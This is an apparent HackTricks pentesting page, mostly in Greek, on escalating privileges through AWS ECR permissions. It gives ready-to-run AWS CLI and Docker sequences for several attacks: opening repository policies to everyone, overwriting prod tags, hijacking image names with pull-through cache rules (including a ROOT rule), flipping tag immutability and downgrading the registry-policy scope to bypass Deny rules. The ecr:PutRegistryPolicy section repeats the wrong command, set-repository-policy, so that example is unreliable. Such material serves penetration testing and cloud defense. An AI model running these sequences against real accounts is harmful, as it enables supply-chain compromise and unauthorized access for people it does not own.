# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Ένας επιτιθέμενος με τα **`ecr:GetAuthorizationToken`** και **`ecr:BatchGetImage`** μπορεί να συνδεθεί στο ECR και να κατεβάσει images.

For more info on how to download images:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Potential Impact:** Έμμεσο privesc μέσω υποκλοπής ευαίσθητων πληροφοριών στην κυκλοφορία.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Ένας επιτιθέμενος με όλα αυτά τα δικαιώματα **μπορεί να συνδεθεί στο ECR και να ανεβάσει images**. Αυτό μπορεί να είναι χρήσιμο για escalation δικαιωμάτων σε άλλα περιβάλλοντα όπου αυτές οι images χρησιμοποιούνται.

Επιπλέον, `ecr:PutImage` μπορεί να χρησιμοποιηθεί για να **overwrite an existing tag** (για παράδειγμα `stable` / `prod`) ανεβάζοντας διαφορετικό image manifest υπό αυτό το tag, ουσιαστικά καταλαμβάνοντας τις αναπτύξεις που βασίζονται σε tag.

Αυτό είναι ιδιαίτερα κρίσιμο όταν downstream consumers κάνουν deploy με βάση tag και **auto-refresh** σε αλλαγές tag, όπως:

- **Lambda container image functions** (`PackageType=Image`) referencing `.../repo:stable`
- ECS services / Kubernetes workloads pulling `repo:prod` (without digest pinning)
- Any CI/CD that redeploys on ECR events

Σε αυτές τις περιπτώσεις, μια overwrite tag μπορεί να οδηγήσει σε **remote code execution** στο περιβάλλον του καταναλωτή και privilege escalation στο IAM role που χρησιμοποιείται από αυτό το workload (για παράδειγμα, ένας Lambda execution role με `secretsmanager:GetSecretValue`).

To learn how to upload a new image/update one, check:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Όπως στην προηγούμενη ενότητα, αλλά για public repositories.

### `ecr:SetRepositoryPolicy`

Ένας επιτιθέμενος με αυτή την άδεια θα μπορούσε να **αλλάξει** την **repository** **policy** ώστε να χορηγήσει στον εαυτό του (ή ακόμα και σε όλους) **read/write access**.\
Για παράδειγμα, σε αυτό το παράδειγμα δίνεται read access σε όλους.\
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
Περιεχόμενα του `my-policy.json`:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Όπως η προηγούμενη ενότητα, αλλά για δημόσια αποθετήρια.\
Ένας επιτιθέμενος μπορεί να **τροποποιήσει την πολιτική αποθετηρίου** ενός ECR Public repository για να χορηγήσει μη εξουσιοδοτημένη δημόσια πρόσβαση ή να κλιμακώσει τα προνόμιά του.
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη δημόσια πρόσβαση στο ECR Public repository, επιτρέποντας σε οποιονδήποτε χρήστη να push, pull ή delete images.

### `ecr:PutRegistryPolicy`

Ένας επιτιθέμενος με αυτήν την άδεια θα μπορούσε να **αλλάξει** την **registry policy** ώστε να παραχωρήσει στον εαυτό του, στον λογαριασμό του (ή ακόμα και σε όλους) **read/write access**.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
### ecr:CreatePullThroughCacheRule

Κακοχρησιμοποίησε τους κανόνες ECR Pull Through Cache (PTC) για να αντιστοιχίσεις ένα attacker-controlled upstream namespace σε ένα αξιόπιστο private ECR prefix. Αυτό κάνει τα workloads που κάνουν pull από το private ECR να λαμβάνουν διαφανώς attacker images χωρίς να χρειάζεται οποιοδήποτε push στο private ECR.

- Απαιτούμενα perms: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. Αν χρησιμοποιείς ECR Public upstream: ecr-public:* για να δημιουργήσεις/push στο public repo.
- Δοκιμασμένο upstream: public.ecr.aws

Βήματα (παράδειγμα):

1. Ετοίμασε attacker image στο ECR Public
# Πάρε το ECR Public alias με: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Δημιούργησε τον κανόνα PTC στο private ECR για να αντιστοιχίσεις ένα trusted prefix στο public registry
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Κάνε pull το attacker image μέσω του private ECR path (δεν έγινε push στο private ECR)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Potential Impact: Συμβιβασμός της αλυσίδας εφοδιασμού (supply-chain) με την υποκλοπή εσωτερικών ονομάτων εικόνων κάτω από το επιλεγμένο prefix. Οποιοδήποτε workload κάνει pull εικόνων από το private ECR χρησιμοποιώντας αυτό το prefix θα λάβει attacker-controlled περιεχόμενο.

### `ecr:PutImageTagMutability`

Κακοχρησιμοποίησε αυτό το permission για να αλλάξεις ένα repository με tag immutability σε mutable και να αντικαταστήσεις trusted tags (π.χ., latest, stable, prod) με attacker-controlled περιεχόμενο.

- Απαιτούμενα perms: `ecr:PutImageTagMutability` συν δυνατότητες push (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`).
- Impact: Συμβιβασμός της αλυσίδας εφοδιασμού με τη σιωπηρή αντικατάσταση immutable tags χωρίς αλλαγή των ονομάτων των tags.

Βήματα (παράδειγμα):

<details>
<summary>Δηλητηρίασε ένα immutable tag αλλάζοντας τη mutability</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### Global registry hijack μέσω ROOT Pull-Through Cache rule

Δημιουργήστε έναν Pull-Through Cache (PTC) κανόνα χρησιμοποιώντας το ειδικό `ecrRepositoryPrefix=ROOT` για να αντιστοιχίσετε τη ρίζα του private ECR registry σε ένα upstream public registry (π.χ., ECR Public). Οποιοδήποτε pull σε μη-υπάρχον repository στον private registry θα σερβίρεται διαφανώς από upstream, επιτρέποντας supply-chain hijacking χωρίς να χρειάζεται push σε private ECR.

- Απαιτούμενα δικαιώματα: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- Επίπτωση: Τα pulls προς `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` θα επιτυγχάνουν και θα δημιουργούν αυτόματα private repos που προέρχονται από upstream.

> Σημείωση: Για κανόνες `ROOT`, παραλείψτε το `--upstream-repository-prefix`. Η παροχή του θα προκαλέσει σφάλμα επικύρωσης.

<details>
<summary>Παράδειγμα (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (Υποβάθμιση `REGISTRY_POLICY_SCOPE` για παράκαμψη των Deny της πολιτικής μητρώου)

Κατάχρηση του `ecr:PutAccountSetting` για εναλλαγή του scope της πολιτικής μητρώου από `V2` (πολιτική που εφαρμόζεται σε όλες τις ενέργειες ECR) σε `V1` (πολιτική που εφαρμόζεται μόνο σε `CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage`). Αν μια περιοριστική πολιτική μητρώου Deny μπλοκάρει ενέργειες όπως `CreatePullThroughCacheRule`, η υποβάθμιση σε `V1` αφαιρεί αυτήν την επιβολή ώστε τα identity‑policy Allows να έχουν ισχύ.

- Απαιτούμενα δικαιώματα: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- Αντίκτυπο: Δυνατότητα εκτέλεσης ενεργειών ECR που προηγουμένως μπλοκαρίστηκαν από registry policy Deny (π.χ., δημιουργία PTC rules) μέσω προσωρινής ρύθμισης του scope σε `V1`.

Βήματα (παράδειγμα):

<details>
<summary>Παράκαμψη του registry policy Deny στο CreatePullThroughCacheRule με αλλαγή σε V1</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
